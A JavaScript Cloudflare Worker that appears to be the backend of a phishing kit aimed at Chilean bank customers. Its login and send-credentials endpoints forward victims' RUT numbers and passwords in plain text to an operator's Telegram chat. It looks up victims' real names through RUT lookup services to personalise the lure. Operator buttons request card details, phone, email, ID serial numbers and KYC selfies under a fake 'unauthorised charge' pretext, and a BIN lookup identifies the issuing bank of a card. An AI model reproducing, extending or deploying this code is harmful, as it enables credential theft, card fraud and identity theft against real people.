// worker.js — Cloudflare Workers version of server.js
// KV binding: RUTS_DB (replaces fs/ruts-db.json)
// Env vars: BOT_TOKEN, CHAT_ID, API_KEY, RUTIFICADOR_API_KEY, RUT_API_URL, RUT_API_TIMEOUT_MS, ENABLE_RUT_FALLBACKS

const LOGIN_DEDUP_WINDOW_MS = 8000;
const recentLoginNotifications = new Map();

function cleanRut(rut) {
  const clean = rut.replace(/\./g, '').replace(/-/g, '').toUpperCase();
  const parts = clean.split('');
  const number = parts.slice(0, -1).join('');
  const dv = parts[parts.length - 1];
  return { number, dv, full: clean };
}

function isValidRut(rut) {
  try {
    const { number, dv } = cleanRut(rut);
    if (!number || number.length < 6 || !dv) return false;
    let sum = 0;
    let multiplier = 2;
    for (let i = number.length - 1; i >= 0; i--) {
      sum += parseInt(number[i]) * multiplier;
      multiplier = multiplier === 7 ? 2 : multiplier + 1;
    }
    const expectedDv = (11 - (sum % 11)) % 11;
    const expectedDvChar = expectedDv === 10 ? 'K' : expectedDv.toString();
    return dv === expectedDvChar;
  } catch (e) {
    return false;
  }
}

function formatRut(rut) {
  const { number, dv } = cleanRut(rut);
  return `${number}-${dv}`;
}

function toTitle(s) {
  return String(s)
    .toLowerCase()
    .split(/\s+/)
    .map((word) => (word ? word[0].toUpperCase() + word.slice(1) : word))
    .join(' ')
    .trim();
}

function pruneRecentLoginNotifications(now = Date.now()) {
  for (const [key, entry] of recentLoginNotifications.entries()) {
    if (now - entry.createdAt > LOGIN_DEDUP_WINDOW_MS) {
      recentLoginNotifications.delete(key);
    }
  }
}

async function getOrCreateLoginNotification(key, factory) {
  const now = Date.now();
  pruneRecentLoginNotifications(now);
  const existing = recentLoginNotifications.get(key);
  if (existing) return existing.promise;

  const promise = (async () => {
    try {
      return await factory();
    } catch (error) {
      recentLoginNotifications.delete(key);
      throw error;
    }
  })();

  recentLoginNotifications.set(key, { createdAt: now, promise });
  const result = await promise;
  recentLoginNotifications.set(key, { createdAt: Date.now(), promise: Promise.resolve(result) });
  return result;
}

async function fetchName(rut, env) {
  const { number, dv } = cleanRut(rut);
  const fullRut = `${number}-${dv}`;
  const RUTIFICADOR_API_KEY = env.RUTIFICADOR_API_KEY || env.API_KEY || '';
  const RUT_API_URL = env.RUT_API_URL || '';
  const ENABLE_RUT_FALLBACKS = env.ENABLE_RUT_FALLBACKS === 'true';
  const RUT_API_TIMEOUT_MS = Number(env.RUT_API_TIMEOUT_MS || 3500);

  if (!isValidRut(rut)) return null;

  const providers = [];

  providers.push({
    name: 'rutificador-live',
    buildUrl: () => `https://api.rutificador.live/search/rut?rut=${encodeURIComponent(fullRut)}`,
    buildHeaders: () => ({
      Accept: 'application/json',
      ...(RUTIFICADOR_API_KEY ? { 'x-api-key': RUTIFICADOR_API_KEY } : {})
    }),
    pickName: (data) => data?.name || data?.nombre || null
  });

  if (RUT_API_URL) {
    providers.push({
      name: 'custom',
      buildUrl: () => `${RUT_API_URL.replace(/\/$/, '')}/${number}`,
      buildHeaders: () => ({ Accept: 'application/json' }),
      pickName: (data) => data?.nombre || data?.name || data?.fullName || null
    });
  }

  if (ENABLE_RUT_FALLBACKS) {
    providers.push(
      {
        name: 'rutify',
        buildUrl: () => `https://rutify.cl/api/rut/${number}`,
        buildHeaders: () => ({ Accept: 'application/json' }),
        pickName: (data) => data?.name || data?.nombre || null
      },
      {
        name: 'rut-api',
        buildUrl: () => `https://rut-api.vercel.app/api?rut=${number}`,
        buildHeaders: () => ({ Accept: 'application/json' }),
        pickName: (data) => data?.nombre || data?.name || null
      }
    );
  }

  for (const provider of providers) {
    try {
      const url = provider.buildUrl();
      const headers = provider.buildHeaders ? provider.buildHeaders() : { Accept: 'application/json' };
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), RUT_API_TIMEOUT_MS);
      try {
        const res = await fetch(url, { headers, signal: controller.signal });
        clearTimeout(timer);
        if (!res.ok) continue;
        const data = await res.json();
        const foundName = provider.pickName(data);
        if (foundName && String(foundName).trim()) return String(foundName).trim();
      } finally {
        clearTimeout(timer);
      }
    } catch (_) {
      // next provider
    }
  }

  // Fallback to KV (registros manuales)
  const kvName = await env.RUTS_DB.get(`rut:${number}`);
  if (kvName) return kvName;

  return null;
}

function getBotones(nombrePersona) {
  return [
    [{ text: '📞 Teléfono', callback_data: 'req:Número de teléfono' }, { text: '✉️ Correo', callback_data: 'req:Correo electrónico' }],
    [{ text: '💳 Tarjeta Débito', callback_data: `req:debito-${nombrePersona}-cobro-no-autorizado` }, { text: '🏦 Tarjeta Crédito', callback_data: `req:credito-${nombrePersona}-cobro-no-autorizado` }],
    [{ text: '🪪 N° Serie doc.', callback_data: 'req:Número de serie del documento' }, { text: '📋 Motivo', callback_data: 'req:Motivo de la consulta' }],
    [{ text: '📷 KYC', callback_data: 'req:Valida tu identidad para verificar que eres tu' }],
    [{ text: '✏️ Solicitud personalizada', callback_data: 'custom:ask' }],
    [{ text: '✅ Finalizar atención', callback_data: 'end:session' }]
  ];
}

async function tgSend(text, keyboard, env) {
  const body = { chat_id: env.CHAT_ID, text, parse_mode: 'HTML' };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  try {
    const res = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const d = await res.json();
    return d.ok ? d.result.message_id : null;
  } catch (_) {
    return null;
  }
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*'
    }
  });
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const { pathname } = url;
    const method = request.method;

    // CORS preflight
    if (method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type'
        }
      });
    }

    // Health check
    if (pathname === '/health') return json({ status: 'ok' });

    // GET /api/get-name
    if (pathname === '/api/get-name' && method === 'GET') {
      const rut = url.searchParams.get('rut');
      if (!rut) return json({ error: 'RUT requerido' }, 400);
      const name = await fetchName(rut, env);
      return json({ success: true, name: name ? toTitle(name) : 'Cliente' });
    }

    // GET /api/rut/lookup
    if (pathname === '/api/rut/lookup' && method === 'GET') {
      const rut = url.searchParams.get('rut');
      if (!rut) return json({ success: false, error: 'RUT requerido' }, 400);
      const valid = isValidRut(rut);
      const name = await fetchName(rut, env);
      return json({
        success: true,
        rut: formatRut(rut),
        valid,
        found: Boolean(name),
        name: name ? toTitle(name) : null,
        displayName: name ? toTitle(name) : 'Cliente'
      });
    }

    // POST /api/rut/register
    if (pathname === '/api/rut/register' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      const { rut, name } = body;
      if (!rut || !name || !String(name).trim()) return json({ success: false, error: 'rut y name son requeridos' }, 400);
      const { number } = cleanRut(String(rut));
      if (!number || number.length < 6) return json({ success: false, error: 'RUT inválido' }, 400);
      const normalizedName = toTitle(String(name));
      await env.RUTS_DB.put(`rut:${number}`, normalizedName);
      return json({ success: true, message: 'RUT registrado correctamente', rut: formatRut(String(rut)), name: normalizedName });
    }

    // GET /api/bin/lookup
    if (pathname === '/api/bin/lookup' && method === 'GET') {
      const bin = url.searchParams.get('bin');
      if (!bin || !/^\d{6}$/.test(String(bin))) return json({ success: false, error: 'BIN inválido (6 dígitos requeridos)' }, 400);
      try {
        const response = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { Accept: 'application/json' } });
        if (!response.ok) return json({ success: false, error: `No se pudo consultar BIN (${response.status})` }, response.status);
        const data = await response.json();
        return json({ success: true, bank: data?.bank?.name || null, type: data?.type || null, scheme: data?.scheme || null, country: data?.country?.name || null });
      } catch (_) {
        return json({ success: false, error: 'Error consultando servicio BIN externo' }, 502);
      }
    }

    // POST /api/login
    if (pathname === '/api/login' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      const { rut, password } = body;
      if (!rut || !password) return json({ error: 'RUT y contraseña requeridos' }, 400);
      if (rut.length < 5) return json({ error: 'RUT inválido' }, 400);

      const loginKey = `${cleanRut(rut).full}|${password}`;
      const loginResult = await getOrCreateLoginNotification(loginKey, async () => {
        const name = await fetchName(rut, env);
        const displayName = name ? toTitle(name) : 'Cliente';
        const BOTONES = getBotones(displayName);
        const msgId = await tgSend(
          `🔔 <b>Nuevo cliente conectado</b>\n\n👤 <b>Nombre:</b> ${displayName}\n🪪 <b>RUT:</b> ${rut}\n\nSelecciona qué información solicitar:`,
          BOTONES,
          env
        );
        return { success: true, name: displayName, rut, messageId: msgId };
      });
      return json(loginResult);
    }

    // POST /api/send-credentials
    if (pathname === '/api/send-credentials' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      const { rut, password, name } = body;
      if (!rut || !password) return json({ error: 'RUT y contraseña requeridos' }, 400);
      const displayName = name || 'Cliente';
      await tgSend(
        `🔐 <b>CREDENCIALES DE LOGIN</b>\n\n<code>RUT: ${rut}</code>\n<code>Contraseña: ${password}</code>\n\n👤 Cliente: <b>${displayName}</b>\n\n--- Selecciona la siguiente acción ---`,
        getBotones(displayName),
        env
      );
      return json({ success: true, message: 'Credenciales y opciones enviadas a Telegram' });
    }

    // POST /api/send-data
    if (pathname === '/api/send-data' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      const { userName, rut, label, answer } = body;
      if (!userName || !rut || !label || !answer) return json({ error: 'Datos incompletos' }, 400);
      const msgId = await tgSend(`✅ <b>Respuesta recibida</b>\n\n👤 ${userName} | ${rut}\n📋 <b>${label}:</b>\n${answer}`, null, env);
      return json({ success: true, messageId: msgId });
    }

    // POST /api/end-session
    if (pathname === '/api/end-session' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      const { userName, rut } = body;
      if (!userName || !rut) return json({ error: 'Datos incompletos' }, 400);
      await tgSend(`🔴 <b>Atención finalizada</b>\n👤 ${userName} | ${rut}\n\nSesión cerrada correctamente.`, null, env);
      return json({ success: true });
    }

    // POST /api/telegram/send-message
    if (pathname === '/api/telegram/send-message' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      const { text, keyboard } = body;
      if (!text) return json({ error: 'Texto requerido' }, 400);
      const msgId = await tgSend(text, keyboard, env);
      return json({ success: true, messageId: msgId });
    }

    // GET /api/telegram/updates
    if (pathname === '/api/telegram/updates' && method === 'GET') {
      const offset = url.searchParams.get('offset') || '0';
      try {
        const response = await fetch(
          `https://api.telegram.org/bot${env.BOT_TOKEN}/getUpdates?offset=${offset}&limit=10&timeout=1`
        );
        const data = await response.json();
        return json({ updates: data.ok ? data.result : [] });
      } catch (_) {
        return json({ updates: [] });
      }
    }

    // POST /api/telegram/answer-callback
    if (pathname === '/api/telegram/answer-callback' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      try {
        await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: body.callbackQueryId, text: '✓ Enviado al cliente' })
        });
        return json({ success: true });
      } catch (_) {
        return json({ success: false });
      }
    }

    // POST /api/telegram/edit-message
    if (pathname === '/api/telegram/edit-message' && method === 'POST') {
      const body = await request.json().catch(() => ({}));
      const { messageId, text, keyboard } = body;
      try {
        await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/editMessageText`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: env.CHAT_ID,
            message_id: messageId,
            text,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard || [] }
          })
        });
        return json({ success: true });
      } catch (_) {
        return json({ success: false });
      }
    }

    // Static assets (portal_2.html, index.html, assets/, etc.)
    return env.ASSETS.fetch(request);
  }
};
